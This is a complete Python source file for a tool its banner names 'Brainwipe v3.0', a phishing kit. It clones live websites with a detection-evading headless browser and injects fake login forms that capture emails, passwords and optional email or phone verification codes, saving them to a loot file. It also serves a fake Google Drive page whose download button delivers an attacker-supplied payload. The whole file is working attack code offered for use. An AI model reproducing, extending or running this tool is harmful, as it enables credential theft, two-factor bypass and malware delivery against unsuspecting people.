import os
import sys
import subprocess
import importlib
import time
import shutil
import requests
import argparse
import signal
import atexit
from urllib.parse import urlparse, unquote
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from bs4 import BeautifulSoup
import cssutils
from cssutils.css import CSSStyleRule
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
class CredentialHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Serve the phishing page and its assets"""
        import mimetypes
        if self.path == '/':
            self.path = '/index.html'
        file_path = os.path.join(server.clone_dir, self.path.lstrip('/'))
        # Security check to prevent directory traversal
        if not os.path.abspath(file_path).startswith(os.path.abspath(server.clone_dir)):
            self.send_response(403)
            self.end_headers()
            self.wfile.write(b"Forbidden")
            return
        if os.path.exists(file_path) and os.path.isfile(file_path):
            try:
                with open(file_path, 'rb') as f:
                    self.send_response(200)
                    content_type, _ = mimetypes.guess_type(file_path)
                    if content_type:
                        self.send_header('Content-type', content_type)
                    self.end_headers()
                    self.wfile.write(f.read())
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(f"Error serving page: {str(e)}".encode())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"File not found")
    def do_POST(self):
        """Handle credential submission"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        credentials = {}
        for pair in post_data.split('&'):
            if '=' in pair:
                key, value = pair.split('=', 1)
                # URL-decode the key and value
                key = unquote(key)
                value = unquote(value)
                credentials[key] = value
        # Save credentials to file
        with open(os.path.join(server.clone_dir, "credentials.txt"), 'a') as f:
            f.write(f"{time.ctime()}: {credentials}\n")
        print(f"[+] Credentials captured: {credentials}")
        # Determine redirect URL
        redirect_url = server.redirect_url if server.redirect_url else server.target_url
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Credentials received. Redirecting...")
        self.wfile.write(f'<meta http-equiv="refresh" content="0;url={redirect_url}">'.encode())
class Brainwipe:
    def __init__(self, verbose=False, no_cleanup=False, template=None, foldername=None, filename=None, payload=None, filesize=None, payload_name=None):
        self.target_url = None
        self.clone_dir = None
        self.verbose = verbose
        self.no_cleanup = no_cleanup
        self.driver = None
        self.email_code = False
        self.phone_code = False
        self.button_color = "#007bff"
        self.redirect_url = None
        self.httpd = None
        self.template = template
        self.foldername = foldername
        self.filename = filename
        self.payload = payload
        self.filesize = filesize
        self.payload_name = payload_name
        atexit.register(self.stop_and_cleanup)
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    def signal_handler(self, signum, frame):
        print(f"\n[!] Received signal {signum}. Cleaning up...")
        self.stop_and_cleanup()
        sys.exit(0)
    def print_banner(self):
        banner = """
+==============================================================+
|                     Brainwipe v3.0                           |
|            Optimized Website Cloning for Phishing            |
|                   Credential Harvesting Tool                 |
+==============================================================+
        """
        print(banner)
    def check_dependencies(self):
        print("[+] Checking dependencies...")
        if not SELENIUM_AVAILABLE:
            print("[-] Selenium not found. Installing...")
            try:
                subprocess.run([sys.executable, "-m", "pip", "install", "selenium", "cssutils"], check=True)
                print("[+] Selenium and cssutils installed.")
                importlib.reload(sys.modules[__name__])
            except:
                print("[-] Failed to install dependencies. Install manually: 'pip install selenium cssutils'")
                sys.exit(1)
        chrome_paths = [
            "/usr/bin/google-chrome", "/usr/bin/chromium-browser", "/usr/bin/chromium",
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
        ]
        chrome_found = any(os.path.exists(path) for path in chrome_paths)
        if not chrome_found:
            print("[-] Chrome/Chromium not found. Please install Chrome or Chromium browser.")
            sys.exit(1)
        print("[+] Dependencies check completed.")
    def setup_selenium_driver(self):
        try:
            chrome_options = Options()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--window-size=1920,1080")
            chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            return True
        except Exception as e:
            print(f"[-] Failed to setup Chrome driver: {e}")
            return False
    def wait_for_page_load(self):
        print("[+] Waiting for page to fully load...")
        try:
            WebDriverWait(self.driver, 30).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            WebDriverWait(self.driver, 30).until(
                lambda driver: driver.execute_script("return document.readyState") == "complete"
            )
            time.sleep(5)
            self.driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
            time.sleep(3)
            self.driver.execute_script("window.scrollTo(0, 0);")
            time.sleep(2)
            return True
        except TimeoutException:
            print("[-] Page load timeout, but continuing...")
            return False
        except Exception as e:
            print(f"[-] Error during page load wait: {e}")
            return False
    def validate_url(self, url):
        try:
            parsed = urlparse(url)
            if not parsed.scheme:
                url = "https://" + url
                parsed = urlparse(url)
            if not parsed.netloc:
                raise ValueError("Invalid URL")
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
            # Try HEAD request first
            try:
                response = requests.head(url, timeout=10, allow_redirects=True, headers=headers)
                print(f"[DEBUG] HEAD status: {response.status_code}")
                if response.status_code in [200, 201, 202, 203, 204, 205, 206, 301, 302, 303, 307, 308]:
                    self.target_url = url
                    print(f"[+] Target URL validated: {url}")
                    return True
                elif response.status_code in [403, 503]:
                    print(f"[!] Warning: Got status {response.status_code} for HEAD, proceeding anyway.")
                    self.target_url = url
                    return True
                else:
                    print(f"[!] HEAD request returned status {response.status_code}")
            except Exception as e:
                print(f"[!] HEAD request error: {e}")
            # If HEAD fails, try GET request
            try:
                response = requests.get(url, timeout=10, allow_redirects=True, headers=headers)
                print(f"[DEBUG] GET status: {response.status_code}")
                if response.status_code in [200, 201, 202, 203, 204, 205, 206, 301, 302, 303, 307, 308]:
                    self.target_url = url
                    print(f"[+] Target URL validated: {url}")
                    return True
                elif response.status_code in [403, 503]:
                    print(f"[!] Warning: Got status {response.status_code} for GET, proceeding anyway.")
                    self.target_url = url
                    return True
                else:
                    print(f"[!] GET request returned status {response.status_code}")
            except Exception as e:
                print(f"[!] GET request error: {e}")
            print(f"[-] URL validation failed for: {url}")
            return False
        except Exception as e:
            print(f"[-] URL validation failed: {str(e)}")
            return False
    def download_assets(self, soup, base_url):
        import re
        import mimetypes
        from urllib.parse import urljoin
        print("[+] Downloading and processing assets...")
        assets_dir = os.path.join(self.clone_dir, "assets")
        os.makedirs(assets_dir, exist_ok=True)
        tags_and_attrs = [('img', 'src'), ('script', 'src'), ('link', 'href')]
        for tag_name, attr in tags_and_attrs:
            for tag in soup.find_all(tag_name):
                if tag.has_attr(attr):
                    url = tag.get(attr)
                    if not url or url.startswith('data:') or url.startswith('#') or url.startswith('javascript:'):
                        continue
                    abs_url = urljoin(base_url, url)
                    try:
                        response = requests.get(abs_url, timeout=10)
                        if response.status_code == 200:
                            content_type = response.headers.get('content-type', '')
                            ext = mimetypes.guess_extension(content_type.split(';')[0]) or '.bin'
                            filename = f"{hash(abs_url) % 1000000}{ext}"
                            file_path = os.path.join(assets_dir, filename)
                            with open(file_path, 'wb') as f:
                                f.write(response.content)
                            new_url = os.path.join('assets', filename)
                            tag[attr] = new_url
                            if self.verbose:
                                print(f"[DEBUG] Downloaded {abs_url} -> {new_url}")
                        else:
                            if self.verbose:
                                print(f"[DEBUG] Failed to download {abs_url} (status: {response.status_code})")
                            tag[attr] = '#'
                    except Exception as e:
                        if self.verbose:
                            print(f"[DEBUG] Error downloading {abs_url}: {e}")
                        tag[attr] = '#'
        for style in soup.find_all('style'):
            css_text = style.string
            if not css_text:
                continue
            urls = re.findall(r'url\((.*?)\)', css_text)
            for url in urls:
                url = url.strip('\'"')
                if not url or url.startswith('data:'):
                    continue
                abs_url = urljoin(base_url, url)
                try:
                    response = requests.get(abs_url, timeout=10)
                    if response.status_code == 200:
                        content_type = response.headers.get('content-type', '')
                        ext = mimetypes.guess_extension(content_type.split(';')[0]) or '.bin'
                        filename = f"{hash(abs_url) % 1000000}{ext}"
                        file_path = os.path.join(assets_dir, filename)
                        with open(file_path, 'wb') as f:
                            f.write(response.content)
                        new_url = os.path.join('assets', filename)
                        css_text = css_text.replace(url, new_url)
                except Exception as e:
                    if self.verbose:
                        print(f"[DEBUG] Error downloading inline CSS asset {abs_url}: {e}")
            style.string = css_text
    def clone_website(self, url):
        print(f"[+] Cloning website: {url}")
        domain = urlparse(url).netloc
        timestamp = int(time.time())
        script_dir = os.path.dirname(os.path.abspath(__file__))
        self.clone_dir = os.path.join(script_dir, "bin", f"{domain}_{timestamp}")
        os.makedirs(self.clone_dir, exist_ok=True)
        print(f"[+] Loot will be saved in: {self.clone_dir}")
        if not self.setup_selenium_driver():
            return False
        try:
            self.driver.get(url)
            self.wait_for_page_load()
            page_source = self.driver.page_source
            if len(page_source) < 1000 or '<body' not in page_source:
                print("[-] Page content invalid or too short")
                return False
            soup = BeautifulSoup(page_source, 'html.parser')
            self.download_assets(soup, url)
            rendered_file = os.path.join(self.clone_dir, "rendered_page.html")
            with open(rendered_file, 'w', encoding='utf-8') as f:
                f.write(str(soup))
            print(f"[+] Page rendered and saved: {rendered_file}")
            return rendered_file
        except Exception as e:
            print(f"[-] Error cloning website: {e}")
            return False
        finally:
            if self.driver:
                self.driver.quit()
                self.driver = None
    def modify_page(self, html_file):
        try:
            with open(html_file, 'r', encoding='utf-8') as f:
                soup = BeautifulSoup(f.read(), 'html.parser')
            # Find a suitable container for the form
            login_container = soup.find('form') or \
                              soup.find(lambda tag: tag.name == 'div' and 'login' in ' '.join(tag.get('class', [])).lower()) or \
                              soup.find(lambda tag: tag.name == 'div' and 'form' in ' '.join(tag.get('class', [])).lower()) or \
                              soup.body
            # Build form fields dynamically
            form_fields = []
            # Email field
            form_fields.append('''
                <div style="margin-bottom: 10px;">
                    <label for="username" style="display: block; margin-bottom: 5px;">Email</label>
                    <input type="email" id="username" name="username" required placeholder="Enter your email" style="width: 100%; padding: 8px; box-sizing: border-box; background-color: transparent; border: 1px solid #555; color: #A8A8A8; border-radius: 3px;">
                </div>
            ''')
            # Password field
            form_fields.append('''
                <div style="margin-bottom: 10px;">
                    <label for="password" style="display: block; margin-bottom: 5px;">Password</label>
                    <input type="password" id="password" name="password" required placeholder="Enter your password" style="width: 100%; padding: 8px; box-sizing: border-box; background-color: transparent; border: 1px solid #555; color: #A8A8A8; border-radius: 3px;">
                </div>
            ''')
            # Email code field (if enabled)
            if self.email_code:
                form_fields.append('''
                    <div style="margin-bottom: 10px;">
                        <label for="email_code" style="display: block; margin-bottom: 5px;">Email Verification Code</label>
                        <input type="text" id="email_code" name="email_code" required placeholder="Enter email verification code" style="width: 100%; padding: 8px; box-sizing: border-box; background-color: transparent; border: 1px solid #555; color: #A8A8A8; border-radius: 3px;">
                    </div>
                ''')
            # Phone code field (if enabled)
            if self.phone_code:
                form_fields.append('''
                    <div style="margin-bottom: 10px;">
                        <label for="phone_code" style="display: block; margin-bottom: 5px;">Phone Verification Code</label>
                        <input type="text" id="phone_code" name="phone_code" required placeholder="Enter phone verification code" style="width: 100%; padding: 8px; box-sizing: border-box; background-color: transparent; border: 1px solid #555; color: #A8A8A8; border-radius: 3px;">
                    </div>
                ''')
            # Build the complete form HTML
            form_fields_html = ''.join(form_fields)
            phishing_form_html = f'''
            <form id="brainwipe-form" method="POST" action="/" style="padding: 20px; margin: 20px; border: 1px solid #ccc; border-radius: 5px;">
                {form_fields_html}
                <button type="submit" id="submit-btn" style="width: 100%; padding: 10px; background-color: {self.button_color}; color: white; border: none; border-radius: 5px; cursor: pointer;">Login</button>
            </form>
            '''
            # Replace the container content with the phishing form
            if login_container:
                login_container.clear()
                phishing_form_soup = BeautifulSoup(phishing_form_html, 'html.parser')
                login_container.append(phishing_form_soup)
            else:
                # As a fallback, append to body
                soup.body.append(BeautifulSoup(phishing_form_html, 'html.parser'))
            # We are removing scripts when modifying the page, not when cloning
            for script in soup.find_all('script'):
                script.decompose()
            # The final phishing page should be index.html
            output_file = os.path.join(self.clone_dir, "index.html")
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(str(soup))
            print(f"[+] Phishing page created: {output_file}")
            return True
        except Exception as e:
            print(f"[-] Error modifying page: {e}")
            return False
    def start_server(self):
        global server
        server = self
        print("[+] Starting HTTP server on http://localhost:8000")
        print("[+] Press Ctrl+C to stop the server")
        self.httpd = HTTPServer(('localhost', 8000), CredentialHandler)
        try:
            self.httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[+] Server stopped by user")
            if self.httpd:
                self.httpd.server_close()
    def stop_and_cleanup(self):
        # Stop the HTTP server if running
        if self.httpd:
            print("[+] Stopping HTTP server...")
            try:
                self.httpd.shutdown()
                self.httpd.server_close()
            except:
                pass
            self.httpd = None
        # Close Selenium driver
        if self.driver:
            print("[+] Closing Selenium driver...")
            try:
                self.driver.quit()
            except:
                pass
            self.driver = None
        # Clean up the loot folder
        if self.no_cleanup:
            print(f"[+] --no-cleanup specified. Files kept at: {self.clone_dir}")
            return
        if self.clone_dir and os.path.exists(self.clone_dir):
            print(f"[+] Cleaning up loot folder: {self.clone_dir}")
            try:
                shutil.rmtree(self.clone_dir)
                print("[+] Cleanup successful.")
                # Also clean up the loot directory if it's empty
                loot_dir = os.path.dirname(self.clone_dir)
                if os.path.exists(loot_dir) and not os.listdir(loot_dir):
                    try:
                        os.rmdir(loot_dir)
                        print(f"[+] Removed empty loot directory: {loot_dir}")
                    except:
                        pass
            except Exception as e:
                print(f"[-] Cleanup failed: {e}")
    def run(self, url=None, verbose=False, no_cleanup=False, email_code=False, phone_code=False, button_color="#007bff", redirect_url=None, template=None, foldername=None, filename=None, payload=None, filesize=None, payload_name=None):
        self.verbose = verbose
        self.no_cleanup = no_cleanup
        self.email_code = email_code
        self.phone_code = phone_code
        self.button_color = button_color
        self.redirect_url = redirect_url
        self.template = template
        self.foldername = foldername
        self.filename = filename
        self.payload = payload
        self.filesize = filesize
        self.payload_name = payload_name
        self.print_banner()
        self.check_dependencies()
        if self.template:
            # Serve the template directory as the phishing site
            script_dir = os.path.dirname(os.path.abspath(__file__))
            sites_dir = os.path.join(script_dir, "sites")
            template_dir = os.path.join(sites_dir, self.template)
            if not os.path.exists(template_dir) or not os.path.isdir(template_dir):
                print(f"[-] Template '{self.template}' not found in {sites_dir}")
                return False
            # Copy template to a temp clone_dir
            timestamp = int(time.time())
            self.clone_dir = os.path.join(script_dir, "bin", f"{self.template}_{timestamp}")
            shutil.copytree(template_dir, self.clone_dir)
            print(f"[+] Serving template '{self.template}' from: {self.clone_dir}")
            # Detect main HTML file and ensure index.html exists
            main_candidates = ["index.html", "login.html", "mobile.html", "index.php"]
            found_main = None
            for candidate in main_candidates:
                candidate_path = os.path.join(self.clone_dir, candidate)
                if os.path.exists(candidate_path):
                    found_main = candidate
                    break
            if found_main and found_main != "index.html":
                # Copy or rename to index.html if not already present
                src = os.path.join(self.clone_dir, found_main)
                dst = os.path.join(self.clone_dir, "index.html")
                shutil.copyfile(src, dst)
                print(f"[+] '{found_main}' copied to 'index.html' for default serving.")
            elif not found_main:
                print("[-] No main HTML file found (index.html, login.html, mobile.html, index.php)")
                return False
            # Inject drive template arguments if template is drive
            if self.template == "drive":
                index_path = os.path.join(self.clone_dir, "index.html")
                if os.path.exists(index_path):
                    with open(index_path, "r", encoding="utf-8") as f:
                        soup = BeautifulSoup(f, "html.parser")

                    # Set <title> to 'DRIVENAME - Google Drive'
                    drive_name = self.foldername or "Drive"
                    title_text = f"{drive_name} - Google Drive"
                    if soup.title:
                        soup.title.string = title_text
                    else:
                        new_title = soup.new_tag("title")
                        new_title.string = title_text
                        if soup.head:
                            soup.head.append(new_title)
                        else:
                            # If <head> doesn't exist, create it
                            new_head = soup.new_tag("head")
                            new_head.append(new_title)
                            if soup.html:
                                soup.html.insert(0, new_head)
                            else:
                                # As a fallback, insert at the top
                                soup.insert(0, new_head)

                    # Folder name
                    folder_div = soup.find("div", class_="o-Yc-o-T")
                    if folder_div and self.foldername:
                        folder_div.string = self.foldername

                    # File name
                    file_div = soup.find("div", class_="KL4NAf")
                    if file_div and self.filename:
                        file_div.string = self.filename

                    # File size
                    size_span = soup.find("span", class_="jApF8d")
                    if size_span and self.filesize:
                        size_span.string = self.filesize

                    # Download button
                    download_div = soup.find("div", class_="akerZd")
                    if download_div and self.payload:
                        # Write payload to a file in the clone_dir
                        payload_filename = self.payload_name or self.filename or "payload.bin"
                        payload_path = os.path.join(self.clone_dir, payload_filename)
                        # If payload is base64, decode; otherwise, write as text
                        try:
                            import base64
                            # Try to decode as base64, fallback to text
                            try:
                                payload_bytes = base64.b64decode(self.payload)
                            except Exception:
                                payload_bytes = self.payload.encode("utf-8")
                            with open(payload_path, "wb") as pf:
                                pf.write(payload_bytes)
                        except Exception as e:
                            print(f"[-] Error writing payload: {e}")
                        # Remove any existing <a> or onclick
                        for a in download_div.find_all("a"):
                            a.decompose()
                        # Add a download link (hidden) and JS to trigger it
                        soup.body.append(BeautifulSoup(f'''
                            <a id="brainwipe-download-link" href="/{payload_filename}" download="{payload_filename}" style="display:none;"></a>
                            <script>
                            document.querySelector('.akerZd').onclick = function() {{
                                var link = document.getElementById('brainwipe-download-link');
                                link.click();
                            }};
                            </script>
                        ''', "html.parser"))

                    with open(index_path, "w", encoding="utf-8") as f:
                        f.write(str(soup))
            # Optionally, modify the template (add fields/colors) if needed
            # For now, just serve as-is
            server_thread = Thread(target=self.start_server)
            server_thread.daemon = True
            server_thread.start()
            try:
                server_thread.join()
            except KeyboardInterrupt:
                print("\n[!] Interrupted by user")
            finally:
                self.stop_and_cleanup()
            return True
        # Default: clone a live site
        if not self.validate_url(url):
            print("[-] Invalid URL provided")
            return False
        rendered_file = self.clone_website(url)
        if not rendered_file:
            print("[-] Website cloning failed")
            return False
        if not self.modify_page(rendered_file):
            print("[-] Failed to modify page")
            return False
        server_thread = Thread(target=self.start_server)
        server_thread.daemon = True  # Make thread daemon so it exits when main thread exits
        server_thread.start()
        try:
            server_thread.join()
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
        finally:
            self.stop_and_cleanup()
        return True
def main():
    parser = argparse.ArgumentParser(
        description="Brainwipe v3.0 - Optimized Website Cloning for Phishing",
        epilog="Example: python brainwipe_optimized.py https://example.com or --template facebook"
    )
    parser.add_argument("url", nargs="?", help="Target URL to clone (omit if using --template)")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--no-cleanup", action="store_true", help="Keep temporary files after execution")
    parser.add_argument("--email-code", action="store_true", help="Add email verification code field")
    parser.add_argument("--phone-code", action="store_true", help="Add phone verification code field")
    parser.add_argument("--button-color", default="#007bff", help="Button color in hex format (default: #007bff)")
    parser.add_argument("--redirect-url", help="Custom redirect URL after form submission")
    parser.add_argument("--template", help="Name of the template to serve from the sites directory")
    parser.add_argument("--template-list", action="store_true", help="List all available templates and exit")
    parser.add_argument("--foldername", help="Folder name for drive template")
    parser.add_argument("--filename", help="File name for drive template")
    parser.add_argument("--payload", help="Payload for drive template")
    parser.add_argument("--filesize", help="File size for drive template")
    parser.add_argument("--payload-file", help="Path to a file to use as the payload (will be base64-encoded automatically)")
    parser.add_argument("--payload-name", help="Payload file name for drive template (overrides --filename for payload only)")
    args = parser.parse_args()

    if args.template_list:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        sites_dir = os.path.join(script_dir, "sites")
        if not os.path.exists(sites_dir):
            print("[-] No 'sites' directory found.")
            sys.exit(1)
        templates = [name for name in os.listdir(sites_dir) if os.path.isdir(os.path.join(sites_dir, name))]
        if not templates:
            print("[-] No templates found in 'sites' directory.")
        else:
            print("Available templates:")
            for t in sorted(templates):
                print(f"  - {t}")
        sys.exit(0)

    import base64
    payload = args.payload
    filename = args.filename
    payload_name = args.payload_name
    if args.payload_file:
        with open(args.payload_file, "rb") as pf:
            payload = base64.b64encode(pf.read()).decode("utf-8")
        if not args.filename:
            filename = os.path.basename(args.payload_file)
        if not payload_name:
            payload_name = os.path.basename(args.payload_file)

    brainwipe = Brainwipe(
        template=args.template,
        foldername=args.foldername,
        filename=filename,
        payload=payload,
        filesize=args.filesize,
        payload_name=payload_name
    )
    success = brainwipe.run(
        url=args.url,
        verbose=args.verbose,
        no_cleanup=args.no_cleanup,
        email_code=args.email_code,
        phone_code=args.phone_code,
        button_color=args.button_color,
        redirect_url=args.redirect_url,
        template=args.template,
        foldername=args.foldername,
        filename=filename,
        payload=payload,
        filesize=args.filesize,
        payload_name=payload_name
    )
    sys.exit(0 if success else 1)
if __name__ == "__main__":
    main()